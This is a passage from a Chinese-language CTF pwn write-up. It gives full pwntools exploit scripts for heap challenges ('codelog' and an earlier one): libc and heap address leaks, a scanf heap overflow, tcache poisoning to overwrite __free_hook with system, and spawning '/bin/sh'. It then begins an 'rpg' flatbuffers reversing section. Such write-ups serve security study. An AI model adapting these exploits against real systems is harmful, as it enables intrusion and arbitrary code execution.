class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>)) </span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">publish_topic</span>(<span class="params">title,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))  </span><br><span class="line">    sla(<span class="string">&quot;title&quot;</span>,title)</span><br><span class="line">    sla(<span class="string">&quot;content size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content data: &quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_topic</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;comment size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;comment data: &quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_topic</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_topic_all</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_topic_all</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_topic</span>(<span class="params">index1,index2</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index1))</span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index2))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_topic</span>(<span class="params">index,title,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;title&quot;</span>,title)</span><br><span class="line">    sla(<span class="string">&quot;content size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content data: &quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">Register(<span class="string">&quot;name&quot;</span>,<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add_car(<span class="number">0x680</span>,<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line">publish_topic(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>,<span class="number">0x20</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">dele_car()</span><br><span class="line"></span><br><span class="line">add_car(<span class="number">0x480</span>,<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line">dele_car()</span><br><span class="line"></span><br><span class="line">add_car(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>,size2=<span class="number">0x470</span>)</span><br><span class="line">show_car()</span><br><span class="line">ru(<span class="string">&quot;Car Intro: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ed031</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit_car(<span class="number">16</span>,<span class="string">&quot;2&quot;</span>*<span class="number">16</span>,size2=<span class="number">0x470</span>)</span><br><span class="line">show_car()</span><br><span class="line">ru(<span class="string">&quot;Car Intro: 2222222222222222&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x820</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    Register(<span class="built_in">str</span>(i),<span class="number">0x68</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">edit_user(<span class="string">&quot;0&quot;</span>,<span class="number">0x6a</span>,<span class="string">&quot;0&quot;</span>*<span class="number">0x68</span>+p16(<span class="number">0x691</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    dele_user(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">Register(<span class="string">&quot;a&quot;</span>,<span class="number">0x68</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">add_car(<span class="number">0x20</span>,<span class="string">&quot;p&quot;</span>,size2=<span class="number">0x600</span>,data2=<span class="string">&quot;p&quot;</span>*<span class="number">0x70</span>+p64(free_hook)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">Register(<span class="string">&quot;b&quot;</span>,<span class="number">0x68</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">Register(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0x68</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="codelog"><a href="#codelog" class="headerlink" title="codelog"></a>codelog</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">codelog: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=dd0a2bd738926ee059e1aceb6873084dcf353a1b, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序只置空了指针而没有置空 size：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( chunk_list[num].ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[num].ptr);</span><br><span class="line">  chunk_list[num].ptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>堆溢出漏洞：（<code>scanf</code> 没有限制输入值的长度）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;chars[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;weight: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;weights[<span class="number">16</span> * i]);</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：遇到 <code>scanf</code> 需要注意是否有堆溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>简单搭建一下堆风水就可以完成泄露：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">init(<span class="number">0x48</span>,<span class="number">0x60</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">8</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(<span class="number">0x110</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">7</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">dele</span><span class="params">(i+<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">dele</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ru</span><span class="params">(<span class="string">&quot;log: &quot;</span>)</span></span></span><br><span class="line"><span class="function">leak_addr </span>= u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1e9061</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<p>利用 scanf 的堆溢出可以修改 tcache，从而劫持 free_hook</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./codelog1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x401AE1&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">size,char,weight</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Init&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        sla(<span class="string">&quot;char:&quot;</span>,char)</span><br><span class="line">        sla(<span class="string">&quot;weight:&quot;</span>,<span class="built_in">str</span>(weight))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encode</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Encode&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;input:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Input: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decode</span>(<span class="params">size,key,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Decode&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;The length of input: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(key))</span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">1</span>):</span><br><span class="line">        sla(<span class="string">&quot;Confirm? [Y/N]&quot;</span>,<span class="string">&quot;N&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Manual input:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show_code</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;Show_code&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show_tree</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;Show_tree&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Add_log&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;log: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Delete_log&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Print_log&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">init(<span class="number">0x48</span>,<span class="string">&quot;1&quot;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x110</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">7</span>-i)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;log: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1e9061</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;1&quot;</span>*<span class="number">7</span> + p64(libc_base+<span class="number">0x1ecbe0</span>)*<span class="number">1</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(libc_base+<span class="number">0x1ecbe0</span>)*<span class="number">2</span></span><br><span class="line">payload += <span class="number">0x70</span> * <span class="string">&quot;2&quot;</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>) + p64(<span class="number">0x240</span>) + p64(free_hook)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&quot;Init&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sla(<span class="string">&quot;char:&quot;</span>,payload)</span><br><span class="line">sla(<span class="string">&quot;weight:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;char:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;weight:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">add(<span class="number">0x110</span>,p64(system))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rpg"><a href="#rpg" class="headerlink" title="rpg"></a>rpg</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rpg: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=b69646b934160ce4f2f19a27b4d4637e7cd180f8, stripped                  </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，NX，PIE</li>
</ul>
<p><strong>flatbuffers 逆向分析</strong></p>
<p>在开始分析本题目前，需要先了解 flatbuffers 的相关知识，可以在官网了解其基础用法：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://flatbuffers.dev/flatbuffers_guide_tutorial.html">FlatBuffers: Tutorial</a> </li>
</ul>
<p>经过长时间的逆向分析，发现程序会大量使用如下结构去索引数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1BE0</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_2E70((__int64)a1, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_2E70</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int16 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_2EA0(a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
